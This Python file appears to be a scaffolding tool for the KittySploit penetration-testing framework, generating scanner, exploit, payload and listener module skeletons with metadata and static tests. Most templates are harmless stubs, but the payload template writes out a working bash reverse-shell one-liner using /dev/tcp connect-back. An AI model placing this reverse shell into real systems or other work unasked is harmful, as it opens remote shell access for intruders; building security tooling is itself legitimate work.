#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Generate KittySploit module skeletons with metadata and tests."""

from __future__ import annotations

import json
import re
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, Iterable, List, Optional


MODULE_KINDS = {
    "scanner": {
        "base": "Scanner",
        "default_subpath": "scanner/http",
        "http_mixin": True,
        "template": "run",
    },
    "auxiliary": {
        "base": "Auxiliary",
        "default_subpath": "auxiliary/scanner",
        "http_mixin": False,
        "template": "run",
    },
    "exploit": {
        "base": "Exploit",
        "default_subpath": "exploits/multi/http",
        "http_mixin": True,
        "template": "exploit",
    },
    "post": {
        "base": "Post",
        "default_subpath": "post/shell/multi",
        "http_mixin": False,
        "template": "run",
    },
    "payload": {
        "base": "Payload",
        "default_subpath": "payloads/singles/cmd/unix",
        "http_mixin": False,
        "template": "payload",
    },
    "listener": {
        "base": "Listener",
        "default_subpath": "listeners/multi",
        "http_mixin": False,
        "template": "listener",
    },
}


@dataclass
class ModuleGenerationResult:
    module_path: Path
    metadata_path: Path
    test_path: Path
    module_relative_path: str
    manifest: Dict[str, Any] = field(default_factory=dict)


class ModuleSkeletonGenerator:
    """Scaffold a new KittySploit module with template source, metadata and tests."""

    DEFAULT_MODULES_DIR = Path("modules")
    DEFAULT_TESTS_DIR = Path("tests") / "modules"

    def __init__(
        self,
        slug: str,
        module_type: str = "scanner",
        subpath: Optional[str] = None,
        name: Optional[str] = None,
        description: Optional[str] = None,
        author: Optional[str] = None,
        tags: Optional[Iterable[str]] = None,
        cve: Optional[str] = None,
        http_mixin: Optional[bool] = None,
    ):
        self.slug = self._slugify(slug)
        if not self.slug:
            raise ValueError("Module slug is required")
        self.module_type = self._normalize_type(module_type)
        self.kind = MODULE_KINDS[self.module_type]
        self.subpath = self._normalize_subpath(subpath or self.kind["default_subpath"])
        self.display_name = (name or self._title_from_slug(self.slug)).strip()
        self.description = (
            description or f"KittySploit {self.module_type} module: {self.display_name}"
        ).strip()
        self.author = self._normalize_author(author or "Your Name")
        self.tags = self._normalize_tags(tags, self.module_type)
        self.cve = (cve or "").strip().upper()
        if self.cve and not re.match(r"^CVE-\d{4}-\d{4,}$", self.cve, re.IGNORECASE):
            raise ValueError(f"Invalid CVE format: {self.cve!r}")
        if http_mixin is None:
            self.http_mixin = bool(self.kind.get("http_mixin"))
        else:
            self.http_mixin = bool(http_mixin)

    def preview(self) -> str:
        module_rel = f"modules/{self.subpath}/{self.slug}.py"
        metadata_rel = f"modules/{self.subpath}/{self.slug}.metadata.json"
        test_rel = f"tests/modules/{self.subpath}/test_{self.slug}.py"
        bases = self._base_classes()
        return "\n".join(
            [
                f"Module: {self.display_name}",
                f"Type: {self.module_type}",
                f"Base class(es): {', '.join(bases)}",
                f"Module file: {module_rel}",
                f"Metadata: {metadata_rel}",
                f"Tests: {test_rel}",
                f"Tags: {', '.join(self.tags)}",
                f"HTTP mixin: {'yes' if self.http_mixin else 'no'}",
            ]
        )

    def generate(
        self,
        modules_dir: str | Path = None,
        tests_dir: str | Path = None,
        force: bool = False,
    ) -> ModuleGenerationResult:
        modules_root = Path(modules_dir or self.DEFAULT_MODULES_DIR)
        tests_root = Path(tests_dir or self.DEFAULT_TESTS_DIR)
        module_dir = modules_root / self.subpath
        test_dir = tests_root / self.subpath
        module_path = module_dir / f"{self.slug}.py"
        metadata_path = module_dir / f"{self.slug}.metadata.json"
        test_path = test_dir / f"test_{self.slug}.py"
        module_relative = f"{self.subpath}/{self.slug}".replace("\\", "/")

        for path in (module_path, metadata_path, test_path):
            self._guard_overwrite(path, force)

        self._ensure_package_dirs(module_dir, test_dir)
        module_source = self.render_module()
        metadata = self.metadata(module_relative, module_path, metadata_path, test_path)
        test_source = self.render_tests(module_relative, metadata_path)

        module_path.write_text(module_source, encoding="utf-8")
        metadata_path.write_text(json.dumps(metadata, indent=2, sort_keys=True) + "\n", encoding="utf-8")
        test_path.write_text(test_source, encoding="utf-8")

        return ModuleGenerationResult(
            module_path=module_path,
            metadata_path=metadata_path,
            test_path=test_path,
            module_relative_path=module_relative,
            manifest=metadata,
        )

    def metadata(
        self,
        module_relative: str,
        module_path: Path,
        metadata_path: Path,
        test_path: Path,
    ) -> Dict[str, Any]:
        info = self._info_dict()
        return {
            "schema_version": "1.0",
            "pack_id": str(uuid.uuid5(uuid.NAMESPACE_URL, f"kittysploit:module:{module_relative}")),
            "generator": "kittysploit new module",
            "module_type": self.module_type,
            "module_path": module_relative,
            "files": {
                "module": str(module_path),
                "metadata": str(metadata_path),
                "tests": str(test_path),
            },
            "info": info,
            "options": self._option_metadata(),
            "assertions": [
                {"type": "has_module_class"},
                {"type": "static_contract_valid"},
                {"type": "metadata_matches_info", "fields": ["name", "description", "author", "tags"]},
            ],
        }

    def render_module(self) -> str:
        template = self.kind["template"]
        if template == "payload":
            return self._render_payload_module()
        if template == "listener":
            return self._render_listener_module()
        if template == "exploit":
            return self._render_exploit_module()
        return self._render_run_module()

    def render_tests(self, module_relative: str, metadata_path: Path) -> str:
        module_file = f"modules/{module_relative}.py"
        metadata_file = str(metadata_path).replace("\\", "/")
        return f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Static contract tests for generated module {self.slug}."""

import json
import pathlib
import unittest


REPO_ROOT = pathlib.Path(__file__).resolve().parents[3]
MODULE_FILE = REPO_ROOT / {module_file!r}
METADATA_FILE = REPO_ROOT / {metadata_file!r}


class GeneratedModuleSkeletonTests(unittest.TestCase):
    def setUp(self):
        self.metadata = json.loads(METADATA_FILE.read_text(encoding="utf-8"))
        self.source = MODULE_FILE.read_text(encoding="utf-8")

    def test_metadata_schema_version(self):
        self.assertEqual(self.metadata["schema_version"], "1.0")
        self.assertEqual(self.metadata["module_path"], {module_relative!r})

    def test_module_source_has_class_module(self):
        self.assertIn("class Module", self.source)
        self.assertIn("__info__", self.source)

    def test_metadata_matches_info(self):
        info = self.metadata["info"]
        for field in ("name", "description", "author", "tags"):
            self.assertIn(field, info)
            self.assertTrue(str(info[field]).strip() if field != "tags" else info[field])

    def test_static_module_contract(self):
        from core.utils.module_static_metadata import validate_static_module_contract

        result = validate_static_module_contract(
            self.metadata["module_path"],
            str(MODULE_FILE),
        )
        self.assertTrue(result["valid"], msg="; ".join(result.get("errors") or []))


if __name__ == "__main__":
    unittest.main()
'''

    def _render_run_module(self) -> str:
        bases = ", ".join(self._base_classes())
        imports = self._render_imports()
        options = self._render_options_run()
        body = self._render_run_body()
        return f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""{self.display_name}"""

{imports}


class Module({bases}):

    __info__ = {self._info_repr()}

{options}
    def run(self):
{body}
'''

    def _render_exploit_module(self) -> str:
        bases = ", ".join(self._base_classes())
        imports = self._render_imports()
        options = self._render_options_exploit()
        body = self._render_exploit_body()
        return f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""{self.display_name}"""

{imports}


class Module({bases}):

    __info__ = {self._info_repr()}

    payload = OptString("", "Payload module path (optional for non-shell exploits)", required=False, advanced=True)

{options}
    def _exploit(self):
        return self.run()

    def run(self):
{body}
'''

    def _render_payload_module(self) -> str:
        return f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""{self.display_name}"""

from kittysploit import *


class Module(Payload):

    __info__ = {self._info_repr(include_payload_meta=True)}

    lhost = OptString("127.0.0.1", "Connect-back host", True)
    lport = OptPort(4444, "Connect-back port", True)

    def generate(self):
        host = str(self.lhost).replace("'", "'\\"'\\"'\\"'")
        port = int(self.lport)
        return f"bash -c 'bash -i >& /dev/tcp/{{host}}/{{port}} 0>&1'"
'''

    def _render_listener_module(self) -> str:
        return f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""{self.display_name}"""

from kittysploit import *


class Module(Listener):

    __info__ = {self._info_repr(include_listener_meta=True)}

    lhost = OptString("0.0.0.0", "Listen/bind address", False)
    lport = OptPort(4444, "Listen port", True)

    def run(self):
        print_info(f"Listener stub on {{self.lhost}}:{{self.lport}}")
        print_warning("Replace this stub with your handler implementation")
        return True
'''

    def _render_imports(self) -> str:
        lines = ["from kittysploit import *"]
        if self.http_mixin:
            lines.append("from lib.protocols.http.http_client import Http_client")
        return "\n".join(lines)

    def _render_options_run(self) -> str:
        if self.http_mixin:
            return (
                "    rhost = OptString(\"\", \"Target host or URL\", required=True)\n"
                "    port = OptPort(80, \"Target HTTP port\", True)\n"
                "    ssl = OptBool(False, \"Use HTTPS\", True, advanced=True)\n"
                "    base_path = OptString(\"/\", \"Base web path\", required=False)\n\n"
            )
        return "    rhosts = OptString(\"\", \"Target host(s)\", required=True)\n\n"

    def _render_options_exploit(self) -> str:
        if self.http_mixin:
            return (
                "    rhost = OptString(\"\", \"Target host or URL\", required=True)\n"
                "    port = OptPort(80, \"Target HTTP port\", True)\n"
                "    ssl = OptBool(False, \"Use HTTPS\", True, advanced=True)\n"
                "    base_path = OptString(\"/\", \"Base web path\", required=False)\n\n"
            )
        return "    rhosts = OptString(\"\", \"Target host(s)\", required=True)\n\n"

    def _render_run_body(self) -> str:
        if self.http_mixin:
            return (
                "        print_info(f\"Scanning {self.rhost}\")\n"
                "        response = self.http_request(method=\"GET\", path=str(self.base_path or \"/\"), allow_redirects=True)\n"
                "        if not response:\n"
                "            print_error(\"No HTTP response from target\")\n"
                "            return False\n"
                "        print_success(f\"Target responded with HTTP {response.status_code}\")\n"
                "        self.set_info(severity=\"info\", reason=\"Replace this stub with real detection logic\")\n"
                "        return True"
            )
        return (
            "        print_info(\"Running module stub\")\n"
            "        print_warning(\"Replace this stub with module logic\")\n"
            "        return True"
        )

    def _render_exploit_body(self) -> str:
        if self.http_mixin:
            return (
                "        print_info(\"Exploit stub — probing target\")\n"
                "        response = self.http_request(method=\"GET\", path=str(self.base_path or \"/\"), allow_redirects=True)\n"
                "        if not response:\n"
                "            print_error(\"Target unreachable\")\n"
                "            return False\n"
                "        print_warning(\"Replace this stub with exploitation logic\")\n"
                "        return True"
            )
        return (
            "        print_info(\"Exploit stub\")\n"
            "        print_warning(\"Replace this stub with exploitation logic\")\n"
            "        return True"
        )

    def _base_classes(self) -> List[str]:
        bases = [self.kind["base"]]
        if self.http_mixin and self.kind["base"] in {"Scanner", "Exploit", "Auxiliary"}:
            bases.append("Http_client")
        return bases

    def _info_dict(self) -> Dict[str, Any]:
        info: Dict[str, Any] = {
            "name": self.display_name,
            "description": self.description,
            "author": self.author,
            "tags": self.tags,
        }
        if self.cve:
            info["cve"] = self.cve
        return info

    def _info_repr(self, include_payload_meta: bool = False, include_listener_meta: bool = False) -> str:
        info = self._info_dict()
        if include_payload_meta:
            info.update(
                {
                    "category": "PayloadCategory.CMD",
                    "platform": "Platform.UNIX",
                    "listener": "listeners/multi/bind_tcp",
                    "handler": "Handler.REVERSE",
                    "session_type": "SessionType.SHELL",
                }
            )
        if include_listener_meta:
            info.update(
                {
                    "handler": "Handler.REVERSE",
                    "session_type": "SessionType.SHELL",
                }
            )
        parts = []
        for key, value in info.items():
            if key == "author":
                if isinstance(value, list):
                    parts.append(f'"author": {json.dumps(value)}')
                else:
                    parts.append(f'"author": {json.dumps([value])}')
            elif key == "tags":
                parts.append(f'"tags": {json.dumps(value)}')
            elif key in {"category", "platform", "handler", "session_type"}:
                parts.append(f'"{key}": {value}')
            elif key == "listener":
                parts.append(f'"listener": {json.dumps(value)}')
            else:
                parts.append(f"{json.dumps(key)}: {json.dumps(value)}")
        return "{\n        " + ",\n        ".join(parts) + ",\n    }"

    def _option_metadata(self) -> Dict[str, Any]:
        if self.module_type == "payload":
            return {"lhost": {"type": "OptString", "required": True}, "lport": {"type": "OptPort", "required": True}}
        if self.module_type == "listener":
            return {"lhost": {"type": "OptString", "required": False}, "lport": {"type": "OptPort", "required": True}}
        if self.http_mixin:
            return {
                "rhost": {"type": "OptString", "required": True},
                "port": {"type": "OptPort", "required": True},
                "ssl": {"type": "OptBool", "required": False},
                "base_path": {"type": "OptString", "required": False},
            }
        return {"rhosts": {"type": "OptString", "required": True}}

    def _normalize_type(self, module_type: str) -> str:
        value = (module_type or "scanner").strip().lower()
        remap = {
            "scan": "scanner",
            "scanners": "scanner",
            "exploits": "exploit",
            "payloads": "payload",
            "listeners": "listener",
            "aux": "auxiliary",
        }
        value = remap.get(value, value)
        if value not in MODULE_KINDS:
            supported = ", ".join(sorted(MODULE_KINDS))
            raise ValueError(f"Unsupported module type {module_type!r}. Supported: {supported}")
        return value

    def _normalize_subpath(self, subpath: str) -> str:
        path = str(subpath or "").strip().replace("\\", "/").strip("/")
        if path.startswith("modules/"):
            path = path[len("modules/"):]
        if not path:
            raise ValueError("Module subpath is required")
        if ".." in path.split("/"):
            raise ValueError("Module subpath must not contain '..'")
        return path

    def _normalize_author(self, author: str) -> List[str]:
        author = str(author or "").strip()
        if not author:
            return ["Your Name"]
        if "," in author:
            return [part.strip() for part in author.split(",") if part.strip()]
        return [author]

    def _normalize_tags(self, tags: Optional[Iterable[str]], module_type: str) -> List[str]:
        normalized: List[str] = []
        for tag in tags or []:
            tag = str(tag).strip().lower()
            if tag and tag not in normalized:
                normalized.append(tag)
        for default in (module_type, self.slug.replace("_", "-")):
            if default and default not in normalized:
                normalized.append(default)
        return normalized

    def _slugify(self, value: str) -> str:
        slug = re.sub(r"[^A-Za-z0-9_]+", "_", str(value or "")).strip("_").lower()
        return slug[:80]

    def _title_from_slug(self, slug: str) -> str:
        return " ".join(part.capitalize() for part in slug.split("_") if part)

    def _guard_overwrite(self, path: Path, force: bool):
        if path.exists() and not force:
            raise FileExistsError(f"Refusing to overwrite {path}. Use --force.")

    def _ensure_package_dirs(self, *directories: Path):
        for directory in directories:
            directory.mkdir(parents=True, exist_ok=True)
            current = directory
            while current.name not in {"", "modules", "tests"}:
                init_file = current / "__init__.py"
                if not init_file.exists():
                    init_file.write_text("", encoding="utf-8")
                parent = current.parent
                if parent == current:
                    break
                current = parent
